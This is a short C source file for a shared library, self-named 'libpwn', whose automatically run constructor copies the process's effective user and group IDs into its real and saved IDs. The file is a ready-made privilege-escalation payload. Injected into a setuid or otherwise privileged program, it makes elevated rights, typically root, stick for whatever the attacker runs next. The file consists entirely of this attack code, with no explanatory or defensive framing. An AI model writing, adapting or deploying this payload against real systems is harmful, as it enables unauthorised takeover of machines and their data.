#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
__attribute__((constructor)) static void __init() {
  uid_t a[3];
  setuid(geteuid());
  setgid(getegid());
  getresuid(a, a+1, a+2);
//   fprintf(stderr, "### r,e,s uid := %d, %d, %d\n", a[0], a[1], a[2]);
  if (setresuid(a[1], a[1], a[1])==-1)
    perror("libpwn: setuid");
  getresgid(a, a+1, a+2);
//   fprintf(stderr, "### r,e,s gid := %d, %d, %d\n", a[0], a[1], a[2]);
  if (setresgid(a[1], a[1], a[1])==-1)
    perror("libpwn: setgid");
}
